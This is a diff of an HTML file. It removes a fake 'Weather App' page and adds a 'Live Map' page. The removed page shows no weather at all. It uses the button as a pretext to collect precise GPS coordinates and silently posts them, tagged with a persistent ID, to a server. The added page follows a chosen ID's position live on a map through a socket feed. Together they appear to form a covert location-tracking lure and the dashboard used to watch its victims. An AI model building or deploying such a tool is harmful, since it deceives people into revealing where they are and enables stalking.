@@ -4,204 +4,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Weather App & Map</title>
+    <title>Live Map</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
     <style>
-        /* Reset */
         * {
             margin: 0;
             padding: 0;
+            font-family: sans-serif;
             box-sizing: border-box;
         }
 
-        /* Body Styling */
         body {
             display: flex;
-            align-items: center;
-            justify-content: center;
+            flex-direction: column;
             height: 100vh;
-            background: linear-gradient(to right, #4facfe, #00f2fe);
-            font-family: Arial, sans-serif;
+            background: #000;
+            color: aliceblue;
         }
 
-        /* Weather Card Styling */
-        .weather-card {
-            background-color: #fff;
-            padding: 25px 20px;
-            border-radius: 15px;
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
-            text-align: center;
-            max-width: 320px;
+        h4 {
+            padding: .5rem;
+
+        }
+
+        #map {
+            height: 100%;
             width: 100%;
-            transform: scale(1.4);
-        }
-
-        /* Title Styling */
-        .weather-card h2 {
-            font-size: 24px;
-            color: #333;
-            margin-bottom: 5px;
-        }
-
-        /* Location Styling */
-        .location {
-            font-size: 16px;
-            color: #555;
-            margin-top: 5px;
-        }
-
-        /* Weather Icon Styling */
-        .weather-icon {
-            margin: 15px 0;
-        }
-
-        .weather-icon img {
-            width: 70px;
-            height: 70px;
-        }
-
-        /* Weather Info Styling */
-        .weather-info {
-            margin: 15px 0;
-        }
-
-        .temperature {
-            display: block;
-            font-size: 42px;
-            font-weight: bold;
-            color: #333;
-        }
-
-        .condition {
-            font-size: 18px;
-            color: #777;
-        }
-
-        /* Button Styling */
-        button, .map-link {
-            display: inline-block;
-            width: 100%;
-            padding: 12px 16px;
-            background-color: #4facfe;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 15px;
-            font-weight: bold;
-            text-decoration: none;
-            transition: background-color 0.3s;
-            margin-top: 8px;
-            text-align: center;
-        }
-
-        button:disabled {
-            opacity: 70%;
-        }
-
-        .map-link {
-            background-color: #34A853; /* Google Green */
-            display: none; /* Hidden by default until location is fetched */
-        }
-
-        .map-link:hover {
-            background-color: #2e8b45;
-        }
-
-        @media(max-width: 500px) {
-            .weather-card {
-                transform: scale(1);
-            }
         }
     </style>
 </head>
 
 <body>
-    <div class="weather-card">
-        <h2>Weather App</h2>
-        <p class="location"><span id="city">Detecting...</span></p>
+    <h4>ID: <span id="display-id"></span></h4>
+    <div id="map"></div>
 
-        <!-- Weather Icon -->
-        <div class="weather-icon">
-            <img src="/weather.png" alt="Weather Icon" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1163/1163657.png'">
-        </div>
 
-        <div class="weather-info">
-            <span class="temperature">--°C</span>
-            <span class="condition">--</span>
-        </div>
-
-        <button id="check-weather">Check Weather</button>
-        
-        <!-- Google Map Link Button -->
-        <a id="map-link" class="map-link" href="#" target="_blank">View on Google Maps</a>
-    </div>
-
+    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
     <script>
-        const id = localStorage.getItem("id") || generateId()
-        const btn = document.querySelector("#check-weather")
-        const mapLink = document.querySelector("#map-link")
-        const citySpan = document.querySelector("#city")
-        let __interval
+        const displayId = document.querySelector("#display-id")
+        const id = new URLSearchParams(location.search).get("id")
+        const latLng = JSON.parse(`{{ data }}`)
+        const map = L.map('map').setView(latLng, 12)
+        const marker = L.marker(latLng).addTo(map)
 
-        btn.addEventListener("click", () => {
-            btn.disabled = true
-            btn.innerHTML = "Fetching Location..."
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            maxZoom: 19,
+        }).addTo(map)
 
-            getLocation()
+        const socket = io("", {
+            secure: true,
+            path: "/socket.io",
+            transports: ['websocket']
         })
 
-        function getLocation() {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude
-                    const lng = position.coords.longitude
+        displayId.innerHTML = id
+        // on update
+        socket.on("map-data", data => {
+            if (data.id == id) {
+                displayId.innerHTML = `${id} - updating`
+                marker.setLatLng([data.lat, data.lng])
+                map.setView([data.lat, data.lng])
 
-                    // Update UI text & show Google Maps button
-                    citySpan.textContent = `Lat: ${lat.toFixed(2)}, Lng: ${lng.toFixed(2)}`;
-                    mapLink.href = `https://www.google.com/maps?q=${lat},${lng}`;
-                    mapLink.style.display = "block";
-
-                    btn.disabled = false;
-                    btn.innerHTML = "Update Weather";
-
-                    // Send data to your server endpoint
-                    fetch("/weather", {
-                        method: "POST",
-                        body: JSON.stringify({
-                            id,
-                            lat,
-                            lng,
-                        }),
-                        headers: {
-                            "Content-Type": "application/json"
-                        }
-                    }).catch(error => {
-                        console.log("post error", error)
-                    })
-                },
-                (error) => {
-                    alert("Please turn on GPS Location permissions.");
-                    btn.disabled = false;
-                    btn.innerHTML = "Check Weather";
-                    console.error("Error watching position:", error);
-                },
-                {
-                    enableHighAccuracy: true,
-                }
-            )
-        }
-
-        function generateId(length = 10) {
-            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let result = '';
-            for (let i = 0; i < length; i++) {
-                const randomIndex = Math.floor(Math.random() * characters.length);
-                result += characters[randomIndex];
+                setTimeout(() => {
+                    displayId.innerHTML = id
+                }, 2500)
             }
-
-            localStorage.setItem("id", result)
-            return result;
-        }
+        })
     </script>
 </body>
 
